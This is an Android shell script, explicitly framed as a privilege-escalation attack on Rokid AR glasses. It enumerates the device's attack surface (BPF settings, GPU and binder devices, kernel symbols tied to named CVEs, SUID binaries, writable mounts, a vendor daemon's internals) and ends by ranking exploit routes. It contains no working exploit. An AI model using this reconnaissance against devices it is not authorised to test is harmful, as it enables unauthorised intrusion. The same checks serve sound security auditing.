#!/system/bin/sh
# ====================================================
# FINAL PRIVILEGE ESCALATION ATTACK SCRIPT
# Target: Rokid AR Glasses, Kernel 5.10.209, Android 12
# ====================================================

echo "=============================================="
echo "[*] FINAL PRIVILEGE ESCALATION ATTACK"
echo "[*] Kernel: $(uname -r)"
echo "[*] Date: $(date)"
echo "=============================================="

# Test 1: BPF Capability Check
echo ""
echo "=== [1] BPF SYSCALL AVAILABILITY ==="
BPF_DISABLED=$(cat /proc/sys/kernel/unprivileged_bpf_disabled 2>/dev/null)
echo "[*] unprivileged_bpf_disabled = $BPF_DISABLED"
if [ "$BPF_DISABLED" = "0" ]; then
    echo "[!] BPF is AVAILABLE to unprivileged users!"
    echo "[!] Potential for BPF verifier exploit"
fi

# Test 2: io_uring ring availability
echo ""
echo "=== [2] IO_URING RING TEST ==="
if [ -e /proc/config.gz ]; then
    CONFIG_IO=$(zcat /proc/config.gz 2>/dev/null | grep CONFIG_IO_URING || echo "Not found")
    echo "[*] $CONFIG_IO"
fi

# Test 3: KGSL GPU Driver Access
echo ""
echo "=== [3] KGSL GPU DRIVER TEST ==="
if [ -c /dev/kgsl-3d0 ]; then
    KGSL_PERM=$(ls -la /dev/kgsl-3d0)
    echo "[*] $KGSL_PERM"
    # Try to open it
    if cat /dev/kgsl-3d0 2>&1 | head -1; then
        echo "[!] Can read from KGSL device!"
    fi
fi

# Test 4: Check for specific CVE patterns
echo ""
echo "=== [4] CVE PATTERN DETECTION ==="

# CVE-2024-36971 Route Table UAF
if cat /proc/kallsyms 2>/dev/null | grep -q "fib_nh_release"; then
    echo "[*] fib_nh_release found - route table code present"
fi

# CVE-2023-2163 BPF Verifier
if cat /proc/kallsyms 2>/dev/null | grep -q "check_stack_access_within_bounds"; then
    echo "[*] check_stack_access_within_bounds found - BPF verifier code present"
fi

# Test 5: Binder Driver Access
echo ""
echo "=== [5] BINDER DRIVER ACCESS ==="
for binder in /dev/binder /dev/hwbinder /dev/vndbinder /dev/binderfs/*; do
    if [ -c "$binder" ] 2>/dev/null; then
        echo "[*] $binder: $(ls -la $binder 2>/dev/null | awk '{print $1,$3,$4}')"
    fi
done

# Test 6: Ashmem Access
echo ""
echo "=== [6] ASHMEM ACCESS ==="
if [ -c /dev/ashmem ]; then
    echo "[*] $(ls -la /dev/ashmem)"
fi

# Test 7: OverlayFS Mount Test
echo ""
echo "=== [7] OVERLAYFS CAPABILITY ==="
if mount 2>&1 | grep -q "overlay"; then
    echo "[!] OverlayFS mounts exist!"
    mount | grep overlay
fi

# Test 8: Check for Sensitive Directories with Weak Permissions
echo ""
echo "=== [8] WEAK PERMISSION DIRECTORIES ==="
for dir in /data/local /data/misc /data/system /system/bin /vendor/bin; do
    if [ -d "$dir" ]; then
        perm=$(ls -ld "$dir" 2>/dev/null | awk '{print $1}')
        echo "[*] $dir: $perm"
    fi
done

# Test 9: SUID/SGID Binaries
echo ""
echo "=== [9] SUID/SGID BINARIES ==="
echo "[*] Searching /system/bin..."
find /system/bin -perm /6000 -type f 2>/dev/null | head -10

echo "[*] Searching /vendor/bin..."
find /vendor/bin -perm /6000 -type f 2>/dev/null | head -10

# Test 10: GTFOBins Check
echo ""
echo "=== [10] GTFOBINS POTENTIAL ==="
for bin in su sudo doas pkexec python perl ruby lua php; do
    if command -v $bin >/dev/null 2>&1; then
        echo "[!] Found: $bin at $(which $bin)"
    fi
done

# Test 11: Writable System Partitions
echo ""
echo "=== [11] WRITABLE MOUNT CHECK ==="
mount | grep -E "system|vendor|data" | grep -v "ro,"

# Test 12: Capabilities Check
echo ""
echo "=== [12] CAPABILITIES ==="
cat /proc/self/status | grep -i cap

# Test 13: Active Network Services (potential for lateral)
echo ""
echo "=== [13] ACTIVE TCP LISTENERS ==="
netstat -tlnp 2>/dev/null | head -15

# Test 14: Kernel Module Loading Capability
echo ""
echo "=== [14] KERNEL MODULE STATUS ==="
if [ -d /lib/modules ]; then
    echo "[*] Modules dir: $(ls /lib/modules/ 2>/dev/null)"
fi
lsmod 2>/dev/null | head -10

# Test 15: Check for Known Vulnerable Binaries
echo ""
echo "=== [15] QSEE/TZ BINARIES ==="
ls -la /vendor/bin/qsee* 2>/dev/null
ls -la /vendor/bin/hw/vendor.qti.hardware.qseecom* 2>/dev/null

# Test 16: Check GateServiced
echo ""
echo "=== [16] GATESERVICED ANALYSIS ==="
GATE_PID=$(pidof GateServiced 2>/dev/null)
if [ -n "$GATE_PID" ]; then
    echo "[*] GateServiced PID: $GATE_PID"
    echo "[*] Running as: $(ps -o user,uid,gid -p $GATE_PID 2>/dev/null | tail -1)"
    echo "[*] FDs:"
    ls -la /proc/$GATE_PID/fd 2>/dev/null | head -10
    echo "[*] Maps (first 5):"
    cat /proc/$GATE_PID/maps 2>/dev/null | head -5
    echo "[*] Cmdline:"
    cat /proc/$GATE_PID/cmdline 2>/dev/null | tr '\0' ' '
    echo ""
fi

# Test 17: Socket Injection Test
echo ""
echo "=== [17] ABSTRACT SOCKET NAMESPACE ==="
cat /proc/net/unix | grep "@" | head -10

# Test 18: Check for ptrace capability
echo ""
echo "=== [18] PTRACE SCOPE ==="
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null

# Test 19: SELinux Context Analysis
echo ""
echo "=== [19] SELINUX CONTEXT ==="
echo "[*] Current context: $(id -Z 2>/dev/null)"
echo "[*] Shell context: $(cat /proc/self/attr/current 2>/dev/null)"

# Test 20: Check for init.rc Injection Points
echo ""
echo "=== [20] INIT.RC ANALYSIS ==="
if [ -r /init.rc ]; then
    grep -i "service\|exec\|import" /init.rc 2>/dev/null | head -10
fi

echo ""
echo "=============================================="
echo "[*] ATTACK VECTOR SUMMARY"
echo "=============================================="
echo "Priority 1: BPF Verifier Exploit (unprivileged_bpf=0)"
echo "Priority 2: KGSL GPU Driver Exploit (/dev/kgsl-3d0 writable)"
echo "Priority 3: Route Table UAF (CVE-2024-36971)"
echo "Priority 4: Binder Driver Exploit"
echo "Priority 5: GateServiced Protocol Abuse"
echo "=============================================="
